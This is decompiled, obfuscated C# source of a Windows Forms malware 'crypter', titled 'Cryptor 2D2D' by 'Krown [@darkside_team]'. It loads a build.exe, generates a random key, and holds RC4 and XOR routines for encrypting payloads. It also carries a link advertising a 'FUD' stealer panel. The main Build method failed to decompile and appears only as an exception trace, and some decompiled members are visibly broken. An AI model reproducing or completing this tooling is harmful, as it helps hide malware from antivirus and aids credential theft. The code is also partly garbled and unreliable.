using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Text;
using System.Windows.Forms;

namespace CodeIdentifiers
{
	// Token: 0x0200000F RID: 15
	public partial class EndChildrenCallback : Form
	{
		// Token: 0x06000085 RID: 133 RVA: 0x00006124 File Offset: 0x00004324
		public EndChildrenCallback()
		{
			this.Action`7();
		}

		// Token: 0x06000086 RID: 134 RVA: 0x00006140 File Offset: 0x00004340
		private void InitCommonControls(object sender, EventArgs e)
		{
			<Module>.openFileDialog_0 = new OpenFileDialog();
			<Module>.openFileDialog_0.Filter = "build.exe |*.exe";
			if (<Module>.openFileDialog_0.ShowDialog() == DialogResult.OK)
			{
				this.set_boolVal.Text = <Module>.openFileDialog_0.FileName;
			}
		}

		// Token: 0x06000087 RID: 135 RVA: 0x00006190 File Offset: 0x00004390
		private void FastEncoder(object sender, EventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000087)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void CodeIdentifiers.EndChildrenCallback::FastEncoder(System.Object,System.EventArgs)
 ---> System.OverflowException: Переполнение в результате выполнения арифметической операции.
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 47
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 387
   в ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:строка 269
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 112
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 88
   --- Конец трассировки внутреннего стека исключений ---
   в ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) в D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:строка 92
   в ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind)
*/;
		}

		// Token: 0x06000088 RID: 136 RVA: 0x00006344 File Offset: 0x00004544
		private static byte[] GetManifestResourceProps(byte[] byte_0, byte[] byte_1)
		{
			<Module>.int_18 = new int[256];
			<Module>.int_19 = new int[256];
			<Module>.byte_0 = new byte[byte_1.Length];
			<Module>.int_20 = 0;
			while (<Module>.int_20 < 256)
			{
				<Module>.int_18[<Module>.int_20] = (int)byte_0[<Module>.int_20 % byte_0.Length];
				<Module>.int_19[<Module>.int_20] = <Module>.int_20;
				<Module>.int_20++;
			}
			int int_ = 0;
			<Module>.int_20 = 0;
			<Module>.int_21 = int_;
			while (<Module>.int_20 < 256)
			{
				<Module>.int_21 = (<Module>.int_21 + <Module>.int_19[<Module>.int_20] + <Module>.int_18[<Module>.int_20]) % 256;
				<Module>.int_22 = <Module>.int_19[<Module>.int_20];
				<Module>.int_19[<Module>.int_20] = <Module>.int_19[<Module>.int_21];
				<Module>.int_19[<Module>.int_21] = <Module>.int_22;
				<Module>.int_20++;
			}
			int int_2 = 0;
			<Module>.int_20 = 0;
			<Module>.int_21 = 0;
			<Module>.int_23 = int_2;
			while (<Module>.int_20 < byte_1.Length)
			{
				<Module>.int_23++;
				<Module>.int_23 %= 256;
				<Module>.int_21 += <Module>.int_19[<Module>.int_23];
				<Module>.int_21 %= 256;
				<Module>.int_22 = <Module>.int_19[<Module>.int_23];
				<Module>.int_19[<Module>.int_23] = <Module>.int_19[<Module>.int_21];
				<Module>.int_19[<Module>.int_21] = <Module>.int_22;
				<Module>.int_24 = <Module>.int_19[(<Module>.int_19[<Module>.int_23] + <Module>.int_19[<Module>.int_21]) % 256];
				<Module>.byte_0[<Module>.int_20] = (byte)((int)byte_1[<Module>.int_20] ^ <Module>.int_24);
				<Module>.int_20++;
			}
			return <Module>.byte_0;
		}

		// Token: 0x17000019 RID: 25
		// (set) Token: 0x06000089 RID: 137 RVA: 0x00006534 File Offset: 0x00004734
		private static int PrimaryKey
		{
			set
			{
				<Module>.dateTime_0 = DateTime.Now;
				<Module>.random_0 = new Random((int)<Module>.dateTime_0.Ticks);
				<Module>.stringBuilder_0 = new StringBuilder();
				<Module>.int_25 = 0;
				while (<Module>.int_25 < value)
				{
					<Module>.char_0 = Convert.ToChar(Convert.ToInt32(Math.Floor(26.0 * <Module>.random_0.NextDouble() + 65.0)));
					<Module>.stringBuilder_0.Append(<Module>.char_0);
					<Module>.int_25++;
				}
				return <Module>.stringBuilder_0.ToString();
			}
		}

		// Token: 0x1700001A RID: 26
		// (set) Token: 0x0600008A RID: 138 RVA: 0x000065D4 File Offset: 0x000047D4
		private static string CodeType
		{
			set
			{
				<Module>.string_5 = "";
				<Module>.int_26 = 0;
				while (<Module>.int_26 < value.Length)
				{
					<Module>.char_1 = (value[<Module>.int_26] ^ '{');
					<Module>.string_5 += <Module>.char_1.ToString();
					<Module>.int_26++;
				}
				return <Module>.string_5;
			}
		}

		// Token: 0x0600008B RID: 139 RVA: 0x00006640 File Offset: 0x00004840
		private void CombineRegion(object sender, EventArgs e)
		{
			<Module>.int_27 = new Random().Next(6, 20);
			this.MemberInit.Text = (EndChildrenCallback.PrimaryKey = <Module>.int_27);
		}

		// Token: 0x0600008C RID: 140 RVA: 0x00006674 File Offset: 0x00004874
		private void GetNextControl(object sender, LinkLabelLinkClickedEventArgs e)
		{
			Process.Start("https://coockie.pro/threads/krown-software-%D0%A2%D0%B2%D0%BE%D0%B9-%D0%B2%D1%8B%D0%B1%D0%BE%D1%80-%D0%BD%D0%B0-%D1%80%D1%8B%D0%BD%D0%BA%D0%B5-stealer-panel-fud.1036/");
		}

		// Token: 0x0600008D RID: 141 RVA: 0x0000668C File Offset: 0x0000488C
		protected virtual void Page(bool disposing)
		{
			if (disposing && this.__BinaryWriter != null)
			{
				this.__BinaryWriter.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x0600008E RID: 142 RVA: 0x000066B8 File Offset: 0x000048B8
		private void Action()
		{
			this.GetCategories = new Label();
			this.set_boolVal = new TextBox();
			this.get_SoapAttribute = new Button();
			this.DurationType = new Label();
			this.MemberInit = new TextBox();
			this.get_FileMinorPart = new Button();
			this.AddAssign = new Button();
			this.SmtpDeliveryFormat = new Label();
			this.FromHex = new LinkLabel();
			base.SuspendLayout();
			this.GetCategories.AutoSize = true;
			this.GetCategories.Location = new Point(12, 30);
			this.GetCategories.Name = "label1";
			this.GetCategories.Size = new Size(32, 13);
			this.GetCategories.TabIndex = 0;
			this.GetCategories.Text = "FILE:";
			this.set_boolVal.Location = new Point(50, 27);
			this.set_boolVal.Name = "textBox1";
			this.set_boolVal.Size = new Size(244, 20);
			this.set_boolVal.TabIndex = 1;
			this.get_SoapAttribute.Location = new Point(311, 27);
			this.get_SoapAttribute.Name = "button1";
			this.get_SoapAttribute.Size = new Size(75, 20);
			this.get_SoapAttribute.TabIndex = 2;
			this.get_SoapAttribute.Text = "...";
			this.get_SoapAttribute.UseVisualStyleBackColor = true;
			this.get_SoapAttribute.Click += this.InitCommonControls;
			this.DurationType.AutoSize = true;
			this.DurationType.Location = new Point(13, 64);
			this.DurationType.Name = "label2";
			this.DurationType.Size = new Size(31, 13);
			this.DurationType.TabIndex = 3;
			this.DurationType.Text = "KEY:";
			this.MemberInit.Location = new Point(50, 61);
			this.MemberInit.Name = "textBox2";
			this.MemberInit.Size = new Size(174, 20);
			this.MemberInit.TabIndex = 4;
			this.get_FileMinorPart.Location = new Point(311, 61);
			this.get_FileMinorPart.Name = "button2";
			this.get_FileMinorPart.Size = new Size(75, 20);
			this.get_FileMinorPart.TabIndex = 5;
			this.get_FileMinorPart.Text = "Generate";
			this.get_FileMinorPart.UseVisualStyleBackColor = true;
			this.get_FileMinorPart.Click += this.CombineRegion;
			this.AddAssign.Location = new Point(259, 94);
			this.AddAssign.Name = "button3";
			this.AddAssign.Size = new Size(160, 46);
			this.AddAssign.TabIndex = 6;
			this.AddAssign.Text = "Build";
			this.AddAssign.UseVisualStyleBackColor = true;
			this.AddAssign.Click += this.FastEncoder;
			this.SmtpDeliveryFormat.AutoSize = true;
			this.SmtpDeliveryFormat.Location = new Point(22, 110);
			this.SmtpDeliveryFormat.Name = "label3";
			this.SmtpDeliveryFormat.Size = new Size(67, 13);
			this.SmtpDeliveryFormat.TabIndex = 7;
			this.SmtpDeliveryFormat.Text = "Best Stealer:";
			this.FromHex.AutoSize = true;
			this.FromHex.Location = new Point(13, 127);
			this.FromHex.Name = "linkLabel1";
			this.FromHex.Size = new Size(82, 13);
			this.FromHex.TabIndex = 8;
			this.FromHex.TabStop = true;
			this.FromHex.Text = "Krown Software";
			this.FromHex.LinkClicked += this.GetNextControl;
			base.AutoScaleDimensions = new SizeF(6f, 13f);
			base.AutoScaleMode = AutoScaleMode.Font;
			base.ClientSize = new Size(431, 155);
			base.Controls.Add(this.FromHex);
			base.Controls.Add(this.SmtpDeliveryFormat);
			base.Controls.Add(this.AddAssign);
			base.Controls.Add(this.get_FileMinorPart);
			base.Controls.Add(this.MemberInit);
			base.Controls.Add(this.DurationType);
			base.Controls.Add(this.get_SoapAttribute);
			base.Controls.Add(this.set_boolVal);
			base.Controls.Add(this.GetCategories);
			base.Name = "Form1";
			this.Text = "Cryptor 2D2D | Coded by Krown [@darkside_team]";
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x04000082 RID: 130
		private IContainer __BinaryWriter;

		// Token: 0x04000083 RID: 131
		private Label GetCategories;

		// Token: 0x04000084 RID: 132
		private TextBox set_boolVal;

		// Token: 0x04000085 RID: 133
		private Button get_SoapAttribute;

		// Token: 0x04000086 RID: 134
		private Label DurationType;

		// Token: 0x04000087 RID: 135
		private TextBox MemberInit;

		// Token: 0x04000088 RID: 136
		private Button get_FileMinorPart;

		// Token: 0x04000089 RID: 137
		private Button AddAssign;

		// Token: 0x0400008A RID: 138
		private Label SmtpDeliveryFormat;

		// Token: 0x0400008B RID: 139
		private LinkLabel FromHex;
	}
}
